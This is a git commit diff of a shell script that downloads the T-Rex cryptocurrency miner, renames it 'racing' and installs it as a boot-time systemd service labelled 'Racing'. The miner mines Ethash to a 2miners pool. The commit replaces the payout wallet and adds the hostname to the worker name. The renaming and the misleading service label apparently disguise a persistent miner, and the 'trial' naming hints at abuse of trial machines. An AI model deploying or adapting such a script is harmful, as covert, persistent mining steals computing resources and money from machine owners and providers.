b6fd5d91239a0f4d0b16cb0b7d3ebbdf5e283dc8
oursourcegtx <93318626+oursourcegtx@users.noreply.github.com>
2022-05-16 20:05:44 +0700

    Update trialupay.sh

--- trialupay.sh
+++ trialupay.sh
@@ -1,6 +1,6 @@
 cd /home
-woker=$(date +'%d%m_%H%M%S_')
-name=Trial_Up_
+woker=$(date +'%d%m_%H%M%S_TrialUp_')
+name=$HOSTNAME
 woker+=$name
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -14,7 +14,7 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w ${woker}_re_trial_up\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w ${woker}_re_trial_up\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
+./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w $woker &
